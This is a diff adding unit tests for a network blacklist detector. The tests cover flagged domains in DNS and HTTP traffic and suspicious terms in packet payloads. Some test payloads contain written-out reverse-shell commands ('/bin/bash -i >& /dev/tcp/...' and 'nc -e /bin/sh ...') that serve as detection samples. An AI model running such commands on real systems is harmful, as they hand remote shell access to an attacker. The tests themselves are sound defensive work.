@@ -485,6 +485,281 @@ class TestBlacklistMatchModel:
         assert "timestamp" in match_dict
 
 
+class TestDomainDetection:
+    """Test domain blacklist detection (AC2)."""
+
+    def test_detect_blacklisted_domain_dns_query(self, temp_blacklist_dir):
+        """Test detection of blacklisted domain in DNS query."""
+        # Load blacklists including domains
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "ips_malware": "data/blacklists_defaults/ips_malware.txt",
+                "domains_phishing": "data/blacklists_defaults/domains_phishing.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        # Create packet with DNS query for blacklisted domain
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="8.8.8.8",
+                port_src=54321,
+                port_dst=53,
+                protocol="UDP",
+                length=64,
+                dns_queries=["malware.com"],  # Blacklisted domain
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_dns")
+
+        assert collection.total == 1
+        anomaly = collection.anomalies[0]
+        assert anomaly.match.match_type == MatchType.DOMAIN
+        assert anomaly.match.matched_value == "malware.com"
+        assert anomaly.criticality_level == CriticalityLevel.CRITICAL
+
+    def test_detect_blacklisted_domain_http_host(self, temp_blacklist_dir):
+        """Test detection of blacklisted domain in HTTP Host header."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "domains_phishing": "data/blacklists_defaults/domains_phishing.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="93.184.216.34",
+                port_src=54321,
+                port_dst=80,
+                protocol="TCP",
+                length=500,
+                http_host="phishing-site.org",  # Blacklisted domain
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_http")
+
+        assert collection.total == 1
+        anomaly = collection.anomalies[0]
+        assert anomaly.match.match_type == MatchType.DOMAIN
+        assert anomaly.match.matched_value == "phishing-site.org"
+        assert anomaly.criticality_level == CriticalityLevel.CRITICAL
+
+    def test_no_duplicate_domain_detection(self, temp_blacklist_dir):
+        """Test that same domain is not detected multiple times."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "domains_phishing": "data/blacklists_defaults/domains_phishing.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        # Multiple packets with same blacklisted domain
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="8.8.8.8",
+                port_src=54321,
+                port_dst=53,
+                protocol="UDP",
+                length=64,
+                dns_queries=["malware.com"],
+            ),
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="8.8.8.8",
+                port_src=54322,
+                port_dst=53,
+                protocol="UDP",
+                length=64,
+                dns_queries=["malware.com"],  # Same domain
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_dup")
+
+        # Should only detect once
+        assert collection.total == 1
+
+    def test_domain_case_insensitive(self, temp_blacklist_dir):
+        """Test that domain detection is case insensitive."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "domains_phishing": "data/blacklists_defaults/domains_phishing.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="8.8.8.8",
+                port_src=54321,
+                port_dst=53,
+                protocol="UDP",
+                length=64,
+                dns_queries=["MALWARE.COM"],  # Uppercase
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_case")
+
+        assert collection.total == 1
+        assert collection.anomalies[0].match.matched_value == "MALWARE.COM"
+
+
+class TestTermDetection:
+    """Test suspicious term detection (AC3)."""
+
+    def test_detect_suspicious_term_in_payload(self, temp_blacklist_dir):
+        """Test detection of suspicious term in payload."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "terms_suspect": "data/blacklists_defaults/terms_suspect.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        # Use port 80 (non-suspicious) to avoid score boost to CRITICAL
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="10.0.0.5",
+                port_src=54321,
+                port_dst=80,  # Non-suspicious port
+                protocol="TCP",
+                length=200,
+                payload_preview="/bin/bash -i >& /dev/tcp/10.0.0.5/80 0>&1",
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_term")
+
+        assert collection.total == 1
+        anomaly = collection.anomalies[0]
+        assert anomaly.match.match_type == MatchType.TERM
+        assert "/bin/bash -i" in anomaly.match.matched_value
+        # AC3: Term matches should be WARNING level (score 65 < 80 threshold)
+        assert anomaly.criticality_level == CriticalityLevel.WARNING
+
+    def test_term_detection_warning_criticality(self, temp_blacklist_dir):
+        """Test that term matches are WARNING criticality (not CRITICAL)."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "terms_suspect": "data/blacklists_defaults/terms_suspect.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="10.0.0.5",
+                port_src=54321,
+                port_dst=4444,
+                protocol="TCP",
+                length=100,
+                payload_preview="nc -e /bin/sh 10.0.0.5 4444",
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_warn")
+
+        assert collection.total == 1
+        # AC3 specifies WARNING for term matches
+        assert collection.anomalies[0].match.criticality == CriticalityLevel.WARNING
+
+    def test_no_detection_clean_payload(self, temp_blacklist_dir):
+        """Test no detection for clean payloads."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "terms_suspect": "data/blacklists_defaults/terms_suspect.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="93.184.216.34",
+                port_src=54321,
+                port_dst=80,
+                protocol="TCP",
+                length=200,
+                payload_preview="GET /index.html HTTP/1.1\r\nHost: example.com\r\n",
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_clean")
+
+        assert collection.total == 0
+
+    def test_term_context_displayed(self, temp_blacklist_dir):
+        """Test that term context is captured in anomaly."""
+        manager = get_blacklist_manager()
+        config = {
+            "defaults": {
+                "terms_suspect": "data/blacklists_defaults/terms_suspect.txt",
+            }
+        }
+        manager.load_blacklists(config, base_path=temp_blacklist_dir)
+
+        detector = BlacklistDetector()
+
+        packets = [
+            PacketInfo(
+                timestamp=datetime.now(),
+                ip_src="192.168.1.10",
+                ip_dst="10.0.0.5",
+                port_src=54321,
+                port_dst=4444,
+                protocol="TCP",
+                length=200,
+                payload_preview="executing /bin/bash -i for reverse shell",
+            ),
+        ]
+
+        collection = detector.detect_all(packets, capture_id="test_ctx")
+
+        assert collection.total == 1
+        context = collection.anomalies[0].match.context
+        assert "/bin/bash -i" in context
+        assert "payload" in context.lower()
+
+
 class TestEdgeCases:
     """Test edge cases for robustness (Code Review M4)."""
 
